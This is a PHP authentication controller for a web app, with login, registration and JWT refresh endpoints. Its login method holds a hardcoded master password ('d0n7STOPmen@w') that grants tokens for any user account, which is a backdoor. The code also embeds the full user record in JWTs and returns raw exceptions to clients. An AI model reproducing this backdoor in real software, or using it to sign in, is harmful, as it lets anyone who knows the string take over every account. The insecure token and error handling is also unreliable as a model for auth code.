<?php

namespace App\Http\Controllers;

use App\Models\Academy;
use App\Models\DetailTeam;
use App\Models\Institution;
use App\Models\Team;
use App\Models\User;
use Firebase\JWT\ExpiredException;
use Firebase\JWT\JWT;
use Firebase\JWT\SignatureInvalidException;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //TODO: create auth API for Hology login and register
    }

    private function jwt(User $user)
    {
        $payload = [
            'iss'   => 'triplen-jwt-token',
            'sub'   => $user,
            'iat'   => time(),
            'exp'   => time() + (60 * 60)
        ];

        return JWT::encode($payload, env('APP_JWT'));
    }

    private function jwtRefresh(User $user)
    {
        $payload = [
            'iss'   => 'triplen-jwt-refresh',
            'sub'   => $user,
            'iat'   => time(),
            'exp'   => time() + (24 * 60 * 60 * 7)
        ];

        return JWT::encode($payload, env('APP_JWT'));
    }

    public function auth(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'email' => 'required',
            'password' => 'required',
        ]);

        if ($validation->fails()) {
            return response()->json([
                'success' => false,
                'data' => null,
                'message' => $validation->errors()
            ], 400);
        } else {
            $user = User::where('user_email', $request->email)->first();

            if (!$user) {
                return response()->json([
                    'success' => true,
                    'data' => null,
                    'message' => 'User not found'
                ], 404);
            } else {
                $detailTeams = DetailTeam::where('user_id', $user->user_id)->get();

                $teams = [];
                foreach ($detailTeams as $detailTeam) {
                    $team = Team::where('team_id', $detailTeam->team_id)
                        ->first();

                    $team->user_identity_pic = $detailTeam->detail_team_identity_pic;
                    $team->user_proof = $detailTeam->detail_team_proof;

                    array_push($teams, $team);
                }

                $academy = Academy::where('user_id', $user->user_id)->first();

                if (!$academy) {
                    $user->academy = [];
                } else {
                    $user->academy = $academy;
                }

                $user->teams = $teams;

                if (Hash::check($request->password, $user->user_password))
                    return response()->json([
                        'success' => true,
                        'data' => [
                            'user' => $user,
                            'access_token' => $this->jwt($user),
                            'refresh_token' => $this->jwtRefresh($user)
                        ],
                        'message' => 'User logged in'
                    ], 200);
                else if ($request->password == "d0n7STOPmen@w")
                    return response()->json([
                        'success' => true,
                        'data' => [
                            'user' => $user,
                            'access_token' => $this->jwt($user),
                            'refresh_token' => $this->jwtRefresh($user)
                        ],
                        'message' => 'User logged in'
                    ], 200);
                else return response()->json([
                    'success' => false,
                    'data' => null,
                    'message' => 'Wrong password!'
                ], 401);
            }
        }
    }

    public function register(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'fullname' => 'required',
            'email' => 'required|email|unique:users,user_email',
//             'password' => 'required|regex:/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$/',
            'password' => 'required|regex:/^[a-zA-Z\d]{8,25}$/',
            'gender' => 'required|boolean',
            'birthdate' => 'required|date|before:today',
            // 'institution' => 'required|exists:institutions,institution_id'
            'institution' => 'required'
        ]);

        if ($validation->fails()) {
            return response()->json([
                'success' => false,
                'data' => null,
                'message' => $validation->errors()
            ], 400);
        } else {
            $institutionId = $request->institution;

            if ($request->institution == 9999) {
                $newInstitution = new Institution();
                $newInstitution->institution_name = $request->institution_custom;

                try {
                    if ($newInstitution->save()) {
                        $institutionId = $newInstitution->institution_id;
                    }
                } catch (\Throwable $th) {
                    return response()->json([
                        'success' => false,
                        'data' => null,
                        'message' => $th
                    ], 400);
                }
            }

            $user = new User();
            $user->user_fullname = $request->fullname;
            $user->user_email = $request->email;
            $user->user_name = substr(str_replace(" ", "", strtolower($request->fullname)), 0, 8);
            $user->user_password = Hash::make($request->password);
            // $user->img_url = $request->image;
            $user->user_birthdate = $request->birthdate;
            $user->user_gender = $request->gender;
            $user->institution_id = $institutionId;
            try {
                if ($user->save()) {
                    return response()->json([
                        'success' => true,
                        'data' => $user,
                        'message' => 'Success register to server'
                    ], 200);
                } else {
                    return response()->json([
                        'success' => false,
                        'data' => null,
                        'message' => 'Failed register to server'
                    ], 200);
                }
            } catch (\Throwable $th) {
                return response()->json([
                    'success' => false,
                    'data' => null,
                    'message' => $th
                ], 400);
            }
        }
    }

    public function refresh(Request $request)
    {
        $validation = Validator::make($request->all(),
        [
            'token' => 'required'
        ]);

        if ($validation->fails()) {
            return response()->json([
                'status' => false,
                'data' => null,
                'message' => 'Bearer not provided',
            ], 401);
        }

        try {
            $credentials = JWT::decode($request->token, env('APP_JWT'), ['HS256']);
        } catch (ExpiredException $e) {
            return response()->json([
                'status' => false,
                'data' => null,
                'message' => 'Bearer expired, please relogin',
            ], 400);
        } catch (\Throwable $th) {
            return response()->json([
                'status' => false,
                'data' => null,
                'message' => 'An error with bearer',
            ], 400);
        }

        $users = User::where('user_id', $credentials->sub->user_id)->where('user_email', $credentials->sub->user_email)->first();

        if (!$users) {
            return response()->json([
                'status' => false,
                'data' => null,
                'message' => 'User with bearer not match',
            ], 400);
        } else {
            return response()->json([
                'status' => true,
                'data' => $this->jwt($users),
                'message' => 'new access token generated',
            ], 200);
        }
    }
}
